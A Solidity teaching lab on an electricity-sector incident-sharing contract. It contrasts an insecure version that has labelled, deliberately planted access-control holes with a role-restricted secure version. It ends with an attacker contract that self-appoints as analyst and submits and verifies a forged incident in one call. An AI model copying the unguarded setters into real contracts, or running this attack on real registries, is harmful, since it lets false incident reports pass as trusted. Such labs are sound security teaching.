// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * SMART CONTRACT LAB:
 *   "Electricity ISAC" (Information Sharing & Analysis Center)
 *
 * Model:
 *   - Members (utilities, operators) submit incidents.
 *   - Analysts verify incidents.
 *   - Consumers can ask: "Is this incident trusted?"
 *
 * Insecure version:
 *   - Anyone can become an analyst.
 *   - Anyone can submit incidents.
 *   - Anyone can verify incidents.
 *   - Full plaintext incident info on-chain.
 *
 * Secure version:
 *   - Owner decides trusted utilities and analysts.
 *   - Incidents use hashes for sensitive details.
 *   - Only analysts can verify.
 *   - "Trusted" requires a verified & authorized path.
 */

/*//////////////////////////////////////////////////////////////
//                    INSECURE ELECTRICITY ISAC
//////////////////////////////////////////////////////////////*/

contract ElectricityISACInsecure {
    struct Incident {
        address reporter;     // who submitted
        string asset;         // e.g. "Substation-01"
        string category;      // "Cyber", "Physical", "Weather"
        string description;   // full plaintext
        uint8 severity;       // 1-10
        bool verified;
        address verifiedBy;
        bool exists;
    }

    // incidentId => Incident
    mapping(uint256 => Incident) public incidents;

    // "Analysts" but anyone can add themselves
    mapping(address => bool) public isAnalyst;

    uint256 public nextIncidentId;

    event AnalystSet(address indexed who, bool status);
    event IncidentSubmitted(uint256 indexed id, address indexed reporter);
    event IncidentVerified(uint256 indexed id, address indexed analyst);

    /**
     * ⚠ VULN #1: Anyone can become an analyst.
     */
    function setAnalyst(address who, bool status) external {
        isAnalyst[who] = status;
        emit AnalystSet(who, status);
    }

    /**
     * ⚠ VULN #2: Anyone can submit an incident with any content.
     */
    function submitIncident(
        string calldata asset,
        string calldata category,
        string calldata description,
        uint8 severity
    ) external returns (uint256) {
        require(severity > 0 && severity <= 10, "BAD_SEVERITY");

        uint256 id = nextIncidentId++;

        incidents[id] = Incident({
            reporter: msg.sender,
            asset: asset,
            category: category,
            description: description,
            severity: severity,
            verified: false,
            verifiedBy: address(0),
            exists: true
        });

        emit IncidentSubmitted(id, msg.sender);
        return id;
    }

    /**
     * ⚠ VULN #3: Anyone can verify any incident.
     */
    function verifyIncident(uint256 id) external {
        Incident storage inc = incidents[id];
        require(inc.exists, "NO_INCIDENT");

        inc.verified = true;
        inc.verifiedBy = msg.sender;

        emit IncidentVerified(id, msg.sender);
    }

    /**
     * Fake trust check:
     *  - incident exists
     *  - verified flag is set
     *  - verifiedBy is marked analyst (but that mapping is attacker-controlled)
     */
    function isTrustedIncident(uint256 id) external view returns (bool) {
        Incident storage inc = incidents[id];
        if (!inc.exists) return false;
        if (!inc.verified) return false;
        if (!isAnalyst[inc.verifiedBy]) return false;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
//                             OWNABLE
//////////////////////////////////////////////////////////////*/

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);

    constructor() {
        owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "ZERO_ADDRESS");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}

/*//////////////////////////////////////////////////////////////
//                    SECURE ELECTRICITY ISAC
//////////////////////////////////////////////////////////////*/

contract ElectricityISACSecure is Ownable {
    struct Incident {
        uint256 id;
        address reporter;       // must be trusted utility
        bytes32 assetId;        // hash of asset identifier
        bytes32 categoryId;     // hash of category
        bytes32 detailsHash;    // hash of full incident report
        uint8 severity;         // 1-10
        bool verified;
        address verifiedBy;     // must be trusted analyst
        bool exists;
    }

    // incidentId => Incident
    mapping(uint256 => Incident) public incidents;

    // Role: trusted grid utilities/operators
    mapping(address => bool) public isUtility;

    // Role: trusted analysts
    mapping(address => bool) public isAnalyst;

    uint256 public nextIncidentId;

    event UtilitySet(address indexed who, bool status);
    event AnalystSet(address indexed who, bool status);
    event IncidentSubmitted(uint256 indexed id, address indexed reporter, bytes32 assetId, bytes32 categoryId);
    event IncidentVerified(uint256 indexed id, address indexed analyst);

    modifier onlyUtility() {
        require(isUtility[msg.sender], "NOT_UTILITY");
        _;
    }

    modifier onlyAnalyst() {
        require(isAnalyst[msg.sender], "NOT_ANALYST");
        _;
    }

    /**
     * Admin sets utility membership.
     */
    function setUtility(address who, bool status) external onlyOwner {
        require(who != address(0), "ZERO_ADDRESS");
        isUtility[who] = status;
        emit UtilitySet(who, status);
    }

    /**
     * Admin sets analysts.
     */
    function setAnalyst(address who, bool status) external onlyOwner {
        require(who != address(0), "ZERO_ADDRESS");
        isAnalyst[who] = status;
        emit AnalystSet(who, status);
    }

    /**
     * Utility submits incident with hashed fields (not raw).
     *
     * assetId:    keccak256("Substation-01")
     * categoryId: keccak256("Cyber") or keccak256("Physical")
     * detailsHash: keccak256(full JSON or doc)
     */
    function submitIncident(
        bytes32 assetId,
        bytes32 categoryId,
        bytes32 detailsHash,
        uint8 severity
    ) external onlyUtility returns (uint256) {
        require(severity > 0 && severity <= 10, "BAD_SEVERITY");
        require(detailsHash != bytes32(0), "EMPTY_DETAILS");

        uint256 id = nextIncidentId++;

        incidents[id] = Incident({
            id: id,
            reporter: msg.sender,
            assetId: assetId,
            categoryId: categoryId,
            detailsHash: detailsHash,
            severity: severity,
            verified: false,
            verifiedBy: address(0),
            exists: true
        });

        emit IncidentSubmitted(id, msg.sender, assetId, categoryId);
        return id;
    }

    /**
     * Analyst verifies an incident.
     * You could add more logic (e.g., min severity) here.
     */
    function verifyIncident(uint256 id) external onlyAnalyst {
        Incident storage inc = incidents[id];
        require(inc.exists, "NO_INCIDENT");

        inc.verified = true;
        inc.verifiedBy = msg.sender;

        emit IncidentVerified(id, msg.sender);
    }

    /**
     * Trusted incident check:
     *  - incident exists
     *  - reporter is a utility
     *  - verified flag is set
     *  - verifier is an analyst
     */
    function isTrustedIncident(uint256 id) external view returns (bool) {
        Incident storage inc = incidents[id];
        if (!inc.exists) return false;
        if (!isUtility[inc.reporter]) return false;
        if (!inc.verified) return false;
        if (!isAnalyst[inc.verifiedBy]) return false;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
//                           ATTACKER
//////////////////////////////////////////////////////////////*/

contract ElectricityISACAttacker {
    ElectricityISACInsecure public target;

    constructor(address _target) {
        target = ElectricityISACInsecure(_target);
    }

    /**
     * Step 1: mark this contract as an analyst in the insecure ISAC.
     */
    function becomeAnalyst() public {
        target.setAnalyst(address(this), true);
    }

    /**
     * Step 2: submit a fake incident with any content and severity.
     */
    function submitFakeIncident(
        string calldata asset,
        string calldata category,
        string calldata description,
        uint8 severity
    ) public returns (uint256) {
        return target.submitIncident(asset, category, description, severity);
    }

    /**
     * Step 3: verify your own fake incident.
     */
    function verifyFake(uint256 id) public {
        target.verifyIncident(id);
    }

    /**
     * One-click full exploit:
     *   - become analyst
     *   - submit fake incident
     *   - verify it
     */
    function fullAttack(
        string calldata asset,
        string calldata category,
        string calldata description,
        uint8 severity
    ) external returns (uint256) {
        becomeAnalyst();
        uint256 id = submitFakeIncident(asset, category, description, severity);
        verifyFake(id);
        return id;
    }
}
